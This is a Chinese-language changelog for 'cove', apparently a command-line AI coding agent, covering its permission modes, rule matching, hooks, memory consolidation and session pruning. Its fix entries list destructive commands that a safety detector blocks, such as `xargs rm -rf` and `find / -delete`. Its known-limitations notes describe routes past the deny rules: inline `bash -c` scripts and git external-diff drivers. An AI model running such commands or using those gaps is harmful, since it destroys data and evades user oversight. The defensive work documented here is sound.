> **升级注意**：新增的 `max_sessions` 默认 200 且默认开启——升级后第一个回合结束时，超过最近 200 个的旧会话会被直接删除（当前会话除外；回合结束摘要行显示“已清理 N 个旧会话（max_sessions=200）”，日志记一条警告）。要保留全部历史，升级前在 `config.json`（或 `.cove.json` / profile）中设置 `"max_sessions": -1`。

### Added
- **单轮上限改为可询问的软上限**：新配置 `max_iterations`（默认 200）、`max_turn_minutes`（交互模式默认 60，`0` 关闭；`-p`/headless 仅显式配置时生效）、`subagent_max_iterations`（默认 60，原硬编码 30）。交互模式到达迭代上限时暂停并显示已调用次数、用时、本轮费用与最近 5 个工具，询问 `[c] 继续 N 次 / [s] 停止`；时间上限同样询问（`[c] 继续 N 分钟`）；连续 60 次迭代没有文件读写时询问一次，之后本轮不再问。回答 `c`/`继续`/`y` 继续同样大小的窗口，其他输入、Ctrl+C 或 15 分钟无应答视为停止（超时提示“等待超时，已按停止处理”）。停止后只显示一行“本轮已停止：已达到单轮最大迭代次数 N。输入 /continue 可继续；可通过配置 max_iterations 调整”（不带 “Request failed” 前缀，也不再重复 /continue 提示）。
- **`--max-turns <N>`**（仅与 `-p` 连用）：`-p` 的迭代上限为硬上限，`--max-turns` 覆盖 `max_iterations`，`0` 不限制；到达上限时 stderr 输出 `Error: 已达到单轮最大迭代次数 N（可用 --max-turns 调整）`，退出码 1。`-p` 与 headless 默认不施加时间上限，只有配置（`config.json`、项目 `.cove.json` 或所选 profile）显式写了 `max_turn_minutes` 时才生效；停滞检测在 `-p` / headless 下只记日志。
- **`/continue`**：上一轮因上限、Ctrl+C、API 错误等中断后，从中断处续跑，已完成的工具步骤及结果保留、不重做；没有可继续的回合时给出提示。Ctrl+C 中断提示改为“[已中断] 正在停止当前任务…输入 /continue 可继续”。headless 模式不支持。
- **回合结束摘要行**：交互模式下，后台工作有值得说的事（本轮提取到记忆、dream 门槛变化、`max_sessions` 清理了旧会话、会话保存失败）时打印一行淡色摘要，如 `已提取 2 条记忆 · dream 还差 2 个会话`；回合之间到达立即显示，回合进行中到达则在该轮输出结束后显示，不插入回答中间；dream 状态在首个回合只记基线；`-p`、headless 与非终端不输出。
- **`/dream status` / `/dream run`**：`status`（或无参数）显示是否启用、距上次整理、时间与会话门槛还差多少、正在整理或上次运行结果；`run` 忽略门槛立即在后台整理（仍需启用且拿到整理锁）。
- **`/memory list` / `/memory stats` 增强**：list 显示“共 N 条”及每条的大小与首行摘要；stats 新增“上次提取: 时间，保存 N 条”（记录在 `~/.cove/memory/.last-extraction.json`）。
- **`/doctor` 与 `/diagnose` 新增两项**：“后台学习”（dream 摘要、记忆条数/大小、上次提取；上次整理失败时警告 E5006）与“权限规则文件”（`policies.json` 无法读取或解析时报 E3004）。均读取当前会话的实际状态。
- **`max_sessions`**（默认 200，负数关闭）：回合结束时自动删除更早的会话，当前会话永不删除，每进程最多每 10 分钟清理一次；有删除时摘要行显示“已清理 N 个旧会话（max_sessions=200）”，进程内首次删除另记一条警告日志。
- **hooks `SessionEnd` 生效**：退出时（`/exit`、Ctrl+D、headless 读完输入、`-p` 结束）触发一次并等待完成（含 async，总上限 30 秒），配置了该 hook 时 stderr 提示“正在运行 SessionEnd hook…”；hook stdin JSON 新增 `session_id`、`cwd`。
- **子智能体部分结果**：子智能体到达上限时返回已完成步骤列表（工具名 + 主要参数，失败标注）与最后一次模型输出，前缀 `Sub-agent did not finish: 已达上限（N 次模型调用），以下为部分结果`。`execute_plan` 中到达上限的任务标记失败但保留部分结果（计划汇总显示“部分结果:”），不再整体重试。

### Changed
- **权限判定顺序**：deny → plan → bypass → **ask → allow** → 模式默认。`ask` 规则不再被同一命令的 `allow`（`[a]`/`[p]`、整工具允许、`policies.json` allow）盖过；`policies.json` 同优先级 deny > ask > allow，与书写顺序无关；`bypass` 下 `ask` 仍不生效。
- **deny / ask 规则按归一化命令匹配**：程序名去目录与 `.exe`、不区分大小写；剥掉 `sudo`/`doas`/`env`/`nohup`/`time`/`command`/`nice`/`exec`/`busybox`/`timeout`（含选项）与 `VAR=value`；git/docker/kubectl/helm/go/npm 等跳过子命令前的全局选项。deny `git push` 现在命中 `git -C . push`、`/usr/bin/git push`、`sudo git push`、`command git push`。allow 规则仍严格逐词比较。
- **cmd.exe 回退不自动放行**：`bash` 工具回退到 cmd 时，`default` 与 `auto` 模式都不再自动放行任何命令（`dir`、`git status`、`go test` 也会询问）；Git Bash / PowerShell 不变。
- **`[p]` 规则随项目切换**：写入 `policies.json` 的规则作为磁盘规则装入本会话，`/cd` 到其他项目时一起卸下并按新项目重新加载；写入失败时退化为会话规则并提示“未能写入，仅本次会话有效”。`/cd` 后新项目的 `policies.json` 无法解析时给出警告，沿用切换前的规则。
- **dream 默认门槛**：12 小时 / 3 个会话（原 24 小时 / 5 个）；整理改在记忆提取之后进行；恢复会话后正在使用的会话不计入门槛；退出时正在运行的整理被取消并回滚锁。
- **`-p` 收尾**：回答后最多等待 20 秒让记忆提取完成；`-p` 进程内不再自动 dream。
- **会话文件首行元数据**：标题/模型/目录变化时随下一次保存重写；tokens/费用最多每 16 次保存刷新一次。
- **edit 模糊匹配缩进单位**：从整个文件推断（相邻行缩进增量的众数）；块内多种深度时用块自身单位，单一深度时仅当整文件单位能映射到与 oldString 相同层级数才使用。
- **grep 溢出提示**：装有 ripgrep 时为 `... at least N more matches|files|lines not shown (...)`，某文件达到单文件上限时注明 `some files hit the per-file cap`。
- **shell 实时进度**：Windows（非 PowerShell）下按行解码 GBK 再推送；无换行的长行超过 4KB 也推送且不切断字符；输出超 2MB 截断时按行边界切。
- **git 子进程环境**：通过 `GIT_CONFIG_COUNT`/`GIT_CONFIG_KEY_n`/`GIT_CONFIG_VALUE_n` 设置 `core.fsmonitor=false`（已有序号时顺延），`GIT_PAGER=cat` 保持。
- **会话中 `git init` 后**下一轮即可获得 git 状态（原需重启）。

### Fixed
- 旧 `/dream` 只把锁文件时间戳改为“刚整理过”，实际不整理，反而推迟下一次自动整理。
- 工具在串行路径（单个调用、批内非并发安全调用、同文件延迟写）中 panic 会使整个进程崩溃；现在变为该调用的 `Error: tool panicked: …` 结果。
- “项目内写入”判断会解析符号链接与 Windows junction；项目内指向项目外的链接、超过 40 跳或成环的链接链一律视为项目外（原超限时 fail-open）。
- `build.bat` 版本号只取 `Version = "..."` 引号内内容；`.golangci.yml` 去掉与 standard 重复的 `unused`。

### Known limitations
- 仓库自身 git 配置（如 `diff.external`、`.gitattributes` 的 `diff.<driver>.command` / `textconv`）指定的外部程序仍可能随自动放行的只读 git 命令（`git diff`/`git show`/`git log -p`）执行；清空这些配置会破坏普通 `git diff`，因此未加固。
- `deny`/`ask` 前缀规则不展开 `bash -c "…"`、`xargs` 等内联脚本中的命令。

## [11.1.0] - 2026-09-25

> 即将发布的版本；源码中的 `Version` 仍为 11.0.0，发布时再同步。

### Added
- **授权提示 `[p] 永久允许（本项目）`**：选项变为 `[y] 允许 / [a] 本次会话总是允许 / [p] 永久允许 / [n] 拒绝`。`[p]` 在本次会话生效的同时把允许规则写入 `~/.cove/policies.json`（设置了 `COVE_CONFIG_DIR` 时位于该目录下，确认提示显示实际路径），规则带 `scope` = 项目根，只在该项目生效；写入为原子操作，文件损坏时不会被覆盖。
- **`policies.json` 规则字段**：`command_prefix`（shell 命令前缀）、`input_equals`（参数精确匹配，用于 MCP 服务器 + 工具名）、`scope`（项目根，空 = 所有项目）。
- **用户级 hooks**：读取 `~/.cove/hooks.json`（不读项目级），支持 `BeforeTool`/`AfterTool`/`SessionStart`/`SessionEnd`（及别名 `PreToolUse`/`PostToolUse`），`matcher` 匹配完整工具名，`command` 用 bash 工具同款 shell 执行，`BeforeTool` 可通过 `{"continue": false}` 阻止调用，支持 `timeout`、`async`。
- **交互模式 Markdown 渐进渲染**：标题、粗体、行内代码、围栏代码块、列表与引用边流式边渲染；不支持 Unicode 的控制台自动降级为 ASCII（`COVE_TUI_ASCII=1` 可强制）。`-p`/headless 输出不受影响。
- **grep 参数**：`ignore_case`、`context`（0–10）、`files_only`；输出路径统一相对当前工作目录。
- **edit 反馈**：成功消息附带改动区域及前后 2 行；多处命中时列出所有行号；模糊匹配时按文件缩进重排 newString。
- **会话存储 `Store.Prune(keep, protect...)`**（暂无调用方）与统一的会话文件辅助函数；`cove -r` 接受 `<id>`、`<id>.jsonl`、`<id>.json`。
- **CI / 发布**：golangci-lint 固定 v2.1.6 并启用 `gosec`、`revive`、`errorlint`；Build Check 增加 `-tags chromedp` 的 vet 与请求拦截测试；发布矩阵新增 `windows/arm64`、`linux/arm64`；`build.bat` 版本号默认读取 `cli/cove/main.go`。

### Changed
- **权限模式分层**：`default` 自动放行只读工具和整行只读的 shell 命令；`auto` 另外放行构建/测试命令与项目内的 write/edit，git 写操作、安装、网络、未知命令、项目外写入、MCP 等仍需确认；`bypass` 全部放行。无规则命中时任何模式下都是“询问”（旧版 `auto` 在无规则命中时直接放行一切）。`-p` 运行无法回答询问，完全无人值守需 `bypass` 或持久化的允许规则。
- **命令前缀规则**：Git Bash/sh 与 PowerShell 下，引号内的参数可包含 `; & | ( ) < >`（cmd 下保持严格）；heredoc / here-string 内容视为 stdin 数据；`$(`、反引号、`${`、`<(`、`>(` 仍不放行。
- **会话存储格式**：`~/.cove/sessions/<id>.jsonl`（首行元数据 + 每行一条消息）+ `index.json` 索引；保存只追加新消息，列会话只读索引；旧 `<id>.json` 仍可加载，下次保存时自动迁移。
- **上下文计数与压缩阈值**：以服务商返回的 `input_tokens` 为锚计算上下文大小（含 system prompt 与工具定义）；压缩预算 = 窗口 × 0.85，触发点 = min(0.75 × 压缩预算, 窗口 − 回复预留 − 8K 安全余量)，回复预留为窗口的 1/4（4K–64K）；200K 模型约 127.5K 触发（原约 5.95 万 token），64K 模型 40K，1M 模型 637.5K。请求的 max_tokens 改为 min(64K, 模型输出上限, 窗口/4)、不低于 4K，不再固定为 64K。masker 的 token 计算同样改用 `token.Estimate`。每回合只刷新 git 信息，不再重扫文件树与 repo map。
- **工具调度（屏障语义）**：同一批调用按原顺序分段执行，并发安全的调用与写入不同文件的 write/edit 并行；遇到 bash 等非并发安全调用时，先等它之前的所有调用完成再单独执行，然后才继续后面的调用；同一文件的重复写入放在整批最后。
- **重试与计价**：退避加入 `[0.5, 1.5)` 抖动；支持 `retry-after-ms` 与 HTTP-date 形式的 `Retry-After`；`anthropic-ratelimit-*-reset` 只在 429 时读取（只看剩余为 0 的限额），5xx 不再读取、按正常退避；Anthropic 非流式超时保持 300s，请求超时不重试，仅连接阶段等传输错误（拒绝、重置）重试；prompt cache 写入按输入价 1.25 倍计费。
- **bash / powershell 工具**：默认超时 120s、上限 10 分钟；超时/取消返回已有输出并标注；工具描述写明实际解释器；关闭子进程彩色输出；Windows 下 Git Bash/cmd 输出尝试 GBK 解码；每流捕获上限 2MB。
- **read 工具**：超长行按字符截断并标注；按行截断时末行为固定格式 `[next: offset=N]`，引擎再截断时仍保留且位于最后一行。工具错误结果同样按输出上限截断。
- **`policies.json` 位置**：与 `config.json` 同目录（遵循 `COVE_CONFIG_DIR`），原先固定为 `~/.cove`。
- **工具块宽度**：旧 OnEngineOutput 前端的工具块按实时终端宽度减 1 列排版，避免 Windows 控制台在最后一列自动折行（原固定 120 列）。
- **测试耗时与隔离**：`go test ./...` 全量约 57–89s（受机器负载影响，此前实测 134s），未删除任何断言；engine 测试通过 TestMain 使用临时 HOME 与 `COVE_CONFIG_DIR`，不再读写开发者真实的 `policies.json` 与会话目录。

### Fixed
- 旧版 `auto` 模式因策略引擎“无规则命中即放行”而实际等同 `bypass`。
- `policies.json` 中的 `deny` / `ask` 规则此前只有 `allow` 被载入会话权限管理器：`deny` 在 `bypass` 模式与前缀放行下不生效、`ask` 不能让只读命令询问；现在三种规则都生效，同优先级下 `deny` 优先于 `allow`。
- `/cd` 切换项目后仍沿用旧项目 `scope` 的持久化规则；现在按新项目根重新加载 `policies.json`。
- 灾难命令拦截补齐：`bash -c`/`sh -c`/`cmd /c`/`powershell -Command`/`pwsh -c` 包装及嵌套、`powershell -EncodedCommand`、`xargs rm -rf`、`find / -delete`、`find ~ -exec rm`、喂给 shell 的 heredoc；引号内参数与喂给 `cat` 的 heredoc 不误拦。
- 上下文按字节 /4 估算导致中文低估约 3 倍且不计 system/工具的问题。
- 串行工具调用与仍在运行的并行调用重叠执行。
- hooks `matcher` 部分匹配（`bash` 误匹配 `bash_output`）。
- 浏览器 SSRF：`safeurl` 新增拒绝 `0.0.0.0/8`、`224.0.0.0/4`、`240.0.0.0/4`、`ff00::/8`、`64:ff9b::/96`；`198.18.0.0/15` 只拒绝直接写 IP（兼容 fake-IP DNS）；无头 Chrome 对页面所有请求做 CDP Fetch 拦截。
- 交互模式每次新请求/重试时重置 Markdown 渲染状态；保存会话时 `index.json` 更新失败不再让保存报错；Windows 下原子重命名遇共享冲突时重试。
- `build.bat` 版本号写死 5.0.0、构建时间非 UTC。

### Removed
- `lsp` 工具（未接入任何 LSP runner）与 `cron` 工具（记录后从不触发）；非 Windows 平台不再注册 `powershell` 工具。
- `internal/telemetry` 包与配置字段 `telemetry`（旧配置中的该键仍可加载，不再生效）。
- 折叠块的 `/x <id>` 展开提示与 `render.Expanded`；goldmark 依赖。
- 死代码：`api.ProviderWithStatus.Model`、`ModelFallback.CurrentModel()`、`engine.MessageNode`/`BuildMessageGraph`、`api/adapter` 的 `Message`/`MergeReasoning`/`HasParseError`、`tool.Context` 的 `AlwaysAllowRules`/`AlwaysDenyRules`。
- 文档：`docs/bubbletea-migration-plan.md`（描述的全屏界面已不存在）；手册中不存在的主题系统与旧 `policy.json` 规则类型说明。

## [11.0.0] - 2026-09-25

### Added
- **Shell 抽象层** (`internal/shell`)：统一命令解释器的选择（Windows 上 cmd/PowerShell，类 Unix 上 sh/bash），使 bash 工具、done-verify 门禁与系统提示词中的环境行保持一致。
- **终端控制序列净化** (`internal/render/sanitize`)：模型回复、推理内容、命令文本、文件/网页摘要等一切非 cove 自身产生的输出在渲染前统一剥离 ANSI 转义序列。
- **灾难性命令检测** (`internal/safety/command.go`)：识别会破坏项目之外数据的 shell 命令（清空文件系统/家目录/系统目录、写裸盘、关机、执行网络拉取的代码）并给出简短原因。
- **读后写保护** (`internal/tool/file_tracker.go`)：记录本会话中模型已读取的文件版本，write/edit 拒绝覆盖模型未曾读取过的文件。
- **旧版编码与行尾支持** (`internal/tool/gbk.go`、`internal/browser/charset.go`、`internal/tool/line_endings.go`)：GBK/GB18030 文件的解码与回写、UTF-8 BOM 处理、CRLF 行尾保留。
- **原子文件替换** (`internal/tool/replace_file*.go`)：write/edit 通过临时文件 + rename 落盘，避免写入中途损坏目标文件。
- **Shell 工具权限作用域** (`internal/permission/command_prefix.go`)：“总是允许”对 shell 类工具按命令前缀授权，而非整工具放行。
- **SSE 解析健壮性** (`internal/api/sse.go`、`internal/mcp/sseparse.go`)：容忍 `data:` 后缺省空格、注释行等非标准但常见的 SSE 写法。
- **API 错误分类** (`internal/api/errors.go`) 与**调用计量 Provider** (`internal/api/metered.go`)：统一的错误判定/重试语义与用量回调。
- **会话项目规范化** (`internal/session/project.go`)：统一项目目录的规范形式，避免同一项目因路径写法不同被拆成多个。
- **Windows 进程树终止** (`internal/mcp/proctree_*.go`)：确保 MCP 子进程连同其子进程一并清理。
- **自定义/插件命令参数展开** (`internal/command/arguments.go`)：`$ARGUMENTS` 占位符填充与追加逻辑。
- **CLI 参数解析独立成文件** (`cli/cove/cli_args.go`) 与 **stdin PTY 检测** (`cli/cove/stdin_pty_*.go`)：支持 `--print`/`--resume` 等参数与管道输入的可靠判定。

### Changed
- **技能系统** (`internal/skills`)：每个技能记录来源，加载优先级为 项目 > 用户 > 插件 > 内置；内置技能收敛为 12 个按需加载技能。
- **大规模重构**：engine、MCP 客户端与连接池、delegate、diagnostic、config、cost 等模块的职责拆分与错误处理整理。
- **工具加固**：grep、read、glob、mcp_tool、webfetch、bash/powershell、browser 等工具的输出处理、编码与路径安全增强。
- **文档**：README 与 `docs/USER_MANUAL.md` 更新（技能数量、命令与配置说明）。

### Fixed
- 引入依赖 `golang.org/x/text` 以支持 GBK/GB18030 解码。

### Tests
- 新增 113 个测试文件，覆盖 api、engine、tool、mcp、permission、config、session、delegate 等模块的边界与回归场景。

## [Unreleased]

### Added
- **配置档案 (Profiles)**：新增 /profile 命令（list/switch/save/delete/show）和 --profile 启动参数，支持切换命名配置切片（model/provider/budget 等）。
- **会话录制与回放 (Record/Replay)**：新增 /record 命令（status/start/stop）、--record 和 --replay 启动参数。录制输出至 events.jsonl，回放时不调用真实 API。
- **Provider Adapter 基础层**：internal/api/adapter/ 包提供 Message、StreamAccumulator、MergeReasoning、ToolCallsFromResponse 等归一化工具（为后续 Provider 重构铺路）。
- **L1b 目录多样性检测**：循环检测 Layer 1b 新增目录指纹分析，同一工具模式在 ≥3 个不同目录中视为探索性工作，不再误判为循环（解决顺序 git 操作误触发问题）。

### Changed
- **压缩语义标签**：压缩注入的上下文提示添加 <compress summary="..."> 标签，给模型清晰信号。
- **Engine 重构**：抽取 stream_handler.go、tool_runner.go、message_processor.go 分担 engine.go 职责；新增 buildMessageGraph() 为后续拓扑感知压缩做准备。
- **循环检测改进**：resetFingerprintHistory() 新增目录状态清理；hasToolCalls() 零值安全性提升。

### Fixed
- 循环检测 L1b 在频繁使用 shell 命令进行 git 操作时误触发自动中止。
- Config.Load() 在 profile 为空时的 nil map 赋值防护。

## [8.0.0] - 2026-07-18

### Added

#### TUI 主题系统 (Theme System)
- 全新主题系统 `internal/tui/theme/`，支持 5 套内置主题：
  - **Catppuccin** (Mocha) — 暖色调舒适主题
  - **Dracula** — 经典暗色高对比主题
  - **Gruvbox** — 复古暖色主题
  - **OneDark** — Atom 编辑器经典主题
  - **TokyoNight** — 夜间蓝紫色调主题
- 主题接口：`theme.go` 定义 `Theme` 接口，包含 20+ 语义化颜色令牌（text、accent、success、warning、error、border 等）
- 按需自由切换：TUI 内通过快捷键或命令切换主题

#### MCP 客户端重构 (Client Refactor)
- `internal/mcp/client.go` 全面重构：连接生命周期管理、超时控制、停止信号通道
- 改进的 goroutine 安全管理：`stopCh` 机制确保 `Receive()` 调用可被取消
- 更健壮的错误处理和重连逻辑

#### 循环检测增强 (LoopDetector)
- Layer 1b 模糊匹配增强：区分工具参数变化，减少误报
- Layer 2 输出循环检测修复：从仅日志升级为主动注入引导+硬中止
- Layer 3 停滞检测激活：`RecordIteration()` 和 `RecordFileActivity()` 现在被正确调用
- 新增 Layer 1b 工具输出进度检测：相同模式下产出 ≥4 种不同输出时重置循环计数

#### 引擎改进 (Engine)
- `OnToolStart` 回调：工具执行前通知，配合 `OnToolProgress` 提供完整生命周期回调
- 流式输出 ANSI 清理：TUI 显示工具输出时自动去除 ANSI 转义码
- CompressHistory 中文乱码修复

### Changed
- **TUI 视图层重构**：tui.go 重写 640+ 行，视图布局全面优化
- **styles.go**：重构为基于主题令牌的样式系统（253 行 → 256 行，+256/-57）
- 引擎中的循环检测配置同步更新（fpWindow = 10）

### Fixed
- 修复 compressHistory() 中文乱码（锟斤拷问题）
- 修复 MCP client 上下文取消未正确处理的问题
- 修复 TUI tool start 时缺少回调通知

### Chore
- `internal/tui/tui_smoke_test.go` 测试覆盖扩展（+267 行）

## [7.1.1] - 2026-07-04

### Chore

- **文档整理**: 将根目录大型开发指南移入 docs/guide/，清理临时文件 (session_notes.md, testout.txt)
- **文档归档**: 将未使用的优化文档移入 docs/archive/（.gitignore 忽略）
- **测试脚本迁移**: test_e2e_steer.py 移入 scripts/
- **.gitignore 优化**: 移除 blanket *.md 规则，改用精确忽略

## [7.0.6] - 2026-07-17

### Added
- **TUI F6 复制模式切换**：按下 F6 可在 TUI 中选择/复制文本（原生拖拽选择）
- Shift+Wheel 支持：按住 Shift 滚动鼠标滚轮时正常滚动视口

## [7.0.5] - 2026-07-04

### Fixed
- **中文乱码修复**：修复多文件中的锟斤拷（mojibake）显示问题
- 清理旧的回退兼容代码（repl_history.go）

### Changed
- Activity 提示从中文改为英文
- Review 输出改为纯英文

## [7.0.4] - 2026-07-03

### Changed
- **文档重组**：将 COVE_COMPLETE_GUIDE.md、DEVELOPMENT_DESIGN.md、DEVELOPMENT_GUIDE.md 移入 docs/guide/
- 清理根目录临时文件（session_notes.md, testout.txt）

### Fixed
- 修复 test_e2e_steer.py 路径问题，移至 scripts/

## [7.0.3] - 2026-07-01

### Changed
- **精简系统提示词**：精简 system_prompt 长度，将参考配置写入 config.example.json
- 减少不必要的上下文占用

## [7.0.2] - 2026-06-30

### Added
- **极致系统提示词优化**：任务完成标准、防编造规则、工具调用规范、双语支持
- 更严格的完成任务验证要求

## [7.0.1] - 2026-06-28

### Chore
- **文档归档**：将未使用的优化文档移入 docs/archive/
- 添加 .gitignore 规则忽略 archive 目录

## [7.0.0] - 2026-06-25

### Added
- **P0-P2 共 14 项完整优化实现**，基于设计文档 (DEVELOPMENT_DESIGN.md)
- 循环检测（3-Layer LoopDetector）
- 模型故障转移（ModelFallback）
- 对话压缩（ChatCompressor）
- 工具输出掩码（ToolOutputMasker）
- NextSpeaker、PolicyEngine、MCP Streamable HTTP
- SessionDiff、Telemetry、Safety、Enhanced RepoMap

### Changed
- Engine 重构：集成 ModelFallback、ModelRouter、LoopDetector 统一编排
- Config 扩展：新增 ModelFast、循环检测相关配置

### Documentation
- 详细设计文档 DEVELOPMENT_DESIGN.md（1208 行）
- 开发指南 DEVELOPMENT_GUIDE.md（1584 行）
- 完整开发手册 COVE_COMPLETE_GUIDE.md（1780 行）
- 配置模板 config.example.json
## [6.3.1] - 2026-06-20

### Added

#### 模型路由 (ModelRouter)
- 双模型自动切换：根据任务复杂度在主模型与 model_fast 之间切换。
- 策略链：override -> complexity classifier -> default，命中即生效。
- 支持运行期切换：/model 命令与 SetModels() 可动态更新。

#### 故障转移 (ModelFallback)
- Provider 链式故障转移：主 Provider 失败时自动切换备用 Provider。
- 三态健康状态：ProviderOK、ProviderDegraded、ProviderUnavailable。
- 冷却恢复机制：429/5xx/超时触发冷却，冷却后自动恢复探测。
- 永久错误检测：401/403 等认证错误标记为不可用，需人工修复。
- TryChat/TryChatStream：统一的非流式/流式故障转移调用入口。
- UI 状态指示：在 /status 中展示健康、降级、不可用状态。

#### 三层循环检测 (3-Layer LoopDetector)
- Layer 1a（精确指纹）：窗口内重复相同 tool-call 指纹触发检测。
- Layer 1b（模糊模式）：窗口内重复相同工具名模式触发检测。
- Layer 2（输出哈希）：窗口内重复输出哈希触发检测。
- Layer 3（停滞检测）：长时间无文件创建/修改时触发停滞提示。
- 只读工具豁免：read、grep、glob、lsp、webfetch、browser、task_list 等不触发循环报警。
- 分级响应：先注入引导，超过阈值后硬中止。

#### 对话压缩 (ChatCompressor)
- 双层压缩：先做轻量截断，再做结构化 AI 摘要。
- 智能触发：接近上下文预算上限时自动执行压缩。
- 安全切分：避免压缩后产生非法消息序列。
- 失败降级：摘要失败时自动回退到保守策略。

#### 工具输出掩码 (ToolOutputMasker)
- 反向扫描 FIFO，优先保留最近上下文。
- 支持磁盘卸载历史工具输出到 ~/.cove/tool-outputs/。
- 交互类工具默认豁免，不参与掩码。
- 避免重复掩码，降低无效噪声。

#### 其他新增
- NextSpeaker：上下文感知的继续/停止决策。
- PolicyEngine：声明式权限策略（allow/deny/ask）。
- MCP Streamable HTTP：支持新的流式传输协议。
- SessionDiff：会话变更追踪与摘要。
- Telemetry：本地遥测记录与容量保护。
- Safety：敏感命令、路径遍历、密钥泄漏检测。
- Enhanced RepoMap：基于引用与增量缓存的仓库映射增强。

### Changed
- Engine 重构：引入 ModelFallback、ModelRouter、LoopDetector 统一编排。
- Config 扩展：新增 ModelFast、循环检测相关配置项。
- Permission 升级：集成 PolicyEngine 作为权限决策入口。
- Hooks 增强：PreToolUse/PostToolUse 支持异步处理。
- MCP 客户端：支持 Streamable HTTP（兼容既有 SSE）。
- Session Store：集成 SessionDiff 追踪。
- State 扩展：新增 ModelFast 字段。

### Fixed
- 修复压缩后相邻 user 消息导致 API 400 的问题。
- 修复只读工具被误判为循环的误报问题。
- 修复 Provider 锁竞争导致的阻塞读问题。
### Documentation
- README.md：补充双模型路由章节与配置示例。
- docs/USER_MANUAL.md：补充模型切换策略、配置字段与 MCP 传输说明。
- CHANGELOG.md：记录本次更新。

## [5.1.2] - 2026-06-11

### Added
- **Plan Executor (execute_plan)**: Declarative multi-step task plans with dependency DAG, topological sort, and parallel sub-agent execution (up to 4 concurrent)
- **Multi-Agent Teams (team_create/team_delete)**: Create agent teams with member tasks and inter-agent message passing (send_message)
- **Cron Scheduler (cron)**: Schedule recurring background tasks via cron expressions
- **Background Task Queue**: Async REPL task execution with queue, merge detection, retry support, and interrupt drafts
- **Checkpoint System**: Auto Git snapshots before write/edit operations with `/undo` and `/checkpoints` commands
- **Headless Browser (browser)**: Chrome-based JS rendering and screenshot capture (chromedp build tag)
- **Web Search (websearch)**: DuckDuckGo-based live web search tool
- **Attachments (/attach)**: File and image attachment in REPL with `@path` inline syntax
- **Session History (/history)**: Browse and resume past conversation sessions with detail view
- **Rate Limit Tracking (/ratelimit)**: API rate limit status monitoring
- **Budget Auto-Mode (/budget auto)**: Smart budget suggestion based on historical usage
- **Git Worktree (worktree/exit_worktree)**: Isolated git worktree creation and cleanup
- **User Manual**: Comprehensive Chinese user manual covering all features, commands, and tools

### Changed
- **README**: Added Agent Tools table, Plan Executor, Teams, Guardrails, Checkpoints, and Diagnostic System
- **docs/**: Reorganized with index, fixed corrupted docs/README.md
- **REPL UI**: Async task execution prevents input blocking; streaming-safe cursor handling

### Fixed
- **Permission prompt hang**: Replaced fmt.Scanln with bufio.Scanner - empty input defaults to deny
- **Tool goroutine panic crash**: Added defer recover() in parallel tool execution goroutines
- **Engine loop after Ctrl+C**: Added ctx.Err() check at iteration start
- **WalkingIndicator race condition**: Synchronized Stop() with doneCh channel

## [4.0.5] - 2026-06-07

### Added
- **CovePhone (Android App)**: First mobile companion app for cove
  - Native Go AI engine (mobile/cove.go) compiled via gomobile into cove-core.aar
  - Full chat UI with thinking display, batch-rendered thinking blocks
  - Settings screen for API key, model, and provider configuration
  - Persistent configuration via SharedPreferences (ViewModel-backed)
  - DeepSeek API integration (real AI, not simulated responses)
- **Mobile Go Engine**: Lightweight standalone engine in mobile/cove.go for Android use
- **Release artifact**: covephone-v4.0.5.apk available in dist/v4.0.5/

### Changed
- **Documentation**: README updated with CovePhone sections (English & Chinese)

## [3.0.3] - 2026-06-06

### Fixed
- GitHub Actions release pipeline paths.

## [1.0.0] - 2026-06-03

### Added
- **Self-Learning Pipeline**: Automatic memory extraction, background skill/memory review, and periodic cross-session memory consolidation (dream)
- **Skill Tools for Agent**: `skills_list` and `skill_view` tools - agents can discover and load skills autonomously
- **Conditional Skill Loading**: Skills with `paths` frontmatter auto-inject when agent opens matching files
- **23 Built-in Skills as Disk Files**: User-editable SKILL.md files in `~/.cove/skills/`
- **Guardrail Time-Window Circuit Breaker**: 6+ consecutive failures in 30s triggers immediate block
- **Session Notes Decision/Discovery Tracking**: Regex-based auto-detection of user decisions
- **Memory Deduplication**: >80% similarity 鈫?merge instead of duplicate
- **Hooks Event System**: `PreToolUse`, `PostToolUse`, `SessionStart` events
- **Checkpoint Auto-Trigger**: Git snapshots before write/edit operations
- **`/dream` Command**: Manual memory consolidation trigger

### Changed
- **Skill System**: Hardcoded skill bundles 鈫?disk-based SKILL.md files
- **`backgroundReview` Throttled**: Minimum 4 new messages between reviews

### Removed
- **Buddy System**: Virtual pet companion removed
- **Suggest System**: Follow-up suggestion generation removed
- **Hardcoded Skill Bundles**: Replaced with disk files

## [1.0.2] - 2025-05-24

### Added
- Cross-platform release artifacts for Windows, Linux, macOS (amd64/arm64)
- Automated release build script with checksum generation

### Fixed
- Various stream processing fixes

## [1.0.1] - 2025-05-XX

### Added
- Initial public release
- Multi-provider AI backend (Anthropic, OpenAI, DeepSeek + 9 compat)
- Interactive REPL with slash commands
- Git integration (commit, review, diff)
- Permission system (default, plan, auto, bypass)
- Config management with env vars, user config, project-level overrides
- Token tracking and cost estimation
- Session save/resume, Memory persistence
- MCP (Model Context Protocol) server support
- Plugin system, Skills system


